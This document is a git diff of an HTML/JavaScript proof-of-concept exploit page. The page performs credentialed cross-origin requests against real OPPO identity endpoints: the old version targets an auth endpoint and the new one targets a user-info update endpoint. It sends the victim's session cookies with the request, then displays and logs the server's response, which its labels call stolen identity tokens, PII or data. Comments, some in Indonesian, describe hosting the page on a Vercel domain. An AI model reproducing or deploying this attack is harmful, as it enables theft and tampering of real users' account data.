@@ -3,34 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exploit PoC - Identity Auth CORS</title>
+    <title>Exploit PoC - CORS & IDOR Chain</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; padding: 20px; max-width: 900px; margin: auto; background-color: #0d1117; color: #c9d1d9; }
-        .container { background: #161b22; padding: 30px; border-radius: 12px; border: 1px solid #30363d; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
-        h1 { color: #f85149; border-bottom: 1px solid #30363d; padding-bottom: 15px; margin-top: 0; }
-        .info { background: #1f2428; padding: 10px; border-left: 4px solid #f85149; margin-bottom: 20px; font-size: 14px; }
-        textarea { width: 100%; height: 120px; margin: 10px 0; padding: 12px; border: 1px solid #30363d; border-radius: 6px; background: #0d1117; color: #b1bac4; font-family: 'Courier New', monospace; box-sizing: border-box; }
-        button { background-color: #238636; color: white; padding: 12px 24px; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; transition: 0.2s; }
-        button:hover { background-color: #2ea043; }
-        .result-box { margin-top: 25px; padding: 15px; background: #000; color: #39ff14; border: 1px solid #30363d; border-radius: 6px; min-height: 80px; word-break: break-all; font-family: 'Courier New', monospace; white-space: pre-wrap; }
-        .label { font-weight: bold; margin-top: 15px; display: block; color: #8b949e; }
-        code { color: #58a6ff; }
+        body { font-family: sans-serif; line-height: 1.6; padding: 20px; max-width: 800px; margin: auto; background-color: #f4f4f9; }
+        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { color: #d9534f; border-bottom: 2px solid #d9534f; padding-bottom: 10px; }
+        textarea { width: 100%; height: 100px; margin: 10px 0; padding: 10px; border: 1px solid #ccc; border-radius: 4px; font-family: monospace; }
+        button { background-color: #d9534f; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        button:hover { background-color: #c9302c; }
+        .result-box { margin-top: 20px; padding: 15px; background: #222; color: #0f0; border-radius: 4px; min-height: 50px; word-break: break-all; font-family: monospace; }
+        .label { font-weight: bold; margin-top: 10px; display: block; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>CORS Identity Data Exfiltration</h1>
-    <div class="info">
-        <strong>Target Endpoint:</strong> <code>https://id.oppo.com/identity/web/v1/authn/auth</code>
-    </div>
+    <h1>CORS Vulnerability PoC</h1>
+    <p>Target: <code>id-sg.oppo.com</code></p>
     
-    <label class="label">Step 1: Paste Request Body (Encrypted Auth Data):</label>
-    <textarea id="payloadInput" placeholder='{"data":"..."} or raw encrypted string'></textarea>
+    <label class="label">Input Request Body (Encrypted Payload):</label>
+    <textarea id="payloadInput" placeholder="Paste encrypted payload here (H4sIA...)"></textarea>
     
-    <button onclick="runExploit()">Trigger Authenticated Request</button>
+    <button onclick="runExploit()">Execute Cross-Origin Request</button>
 
-    <label class="label">Step 2: Captured Response (Stolen Identity Token/PII):</label>
+    <label class="label">Server Response (Stolen Data):</label>
     <div id="result" class="result-box">Waiting for execution...</div>
 </div>
 
@@ -38,21 +34,19 @@
     function runExploit() {
         const resultDiv = document.getElementById("result");
         const payload = document.getElementById("payloadInput").value;
-        // Updated target URL as per your new information
-        const targetUrl = "https://id.oppo.com/identity/web/v1/authn/auth";
+        const targetUrl = "https://id-sg.oppo.com/uc/web/v1/user-info/update-basic-info";
 
         if (!payload) {
-            alert("Please provide the authentication payload first!");
+            alert("Please paste a payload first!");
             return;
         }
 
-        resultDiv.innerText = "Attacking... Sending authenticated cross-origin request.";
-        resultDiv.style.color = "#39ff14";
+        resultDiv.innerText = "Sending request...";
 
         const xhr = new XMLHttpRequest();
         xhr.open("POST", targetUrl, true);
         
-        // IMPORTANT: This allows us to use the victim's session cookies for id.oppo.com
+        // KUNCI UTAMA: Mengirimkan cookie asli korban dari domain Vercel ini
         xhr.withCredentials = true; 
         
         xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
@@ -60,13 +54,13 @@
         xhr.onreadystatechange = function() {
             if (xhr.readyState === 4) {
                 if (xhr.status === 200) {
-                    // Success means the browser allowed reading the response from id.oppo.com
-                    resultDiv.innerText = "SUCCESS: Response Captured!\n\n" + xhr.responseText;
-                    console.log("Stolen Auth Data:", xhr.responseText);
+                    // Jika teks muncul di sini, SOP browser telah ditembus
+                    resultDiv.innerText = xhr.responseText;
+                    console.log("Success! Stolen Data:", xhr.responseText);
                 } else {
-                    resultDiv.innerText = "FAILED: Status " + xhr.status + "\nThis might be due to session timeout or CORS blocking the specific origin.";
-                    resultDiv.style.color = "#f85149";
-                    console.error("XHR Error:", xhr.status, xhr.statusText);
+                    resultDiv.innerText = "Error: " + xhr.status + " - Check Console for details.";
+                    resultDiv.style.color = "#ff4d4d";
+                    console.error("Request failed with status:", xhr.status);
                 }
             }
         };
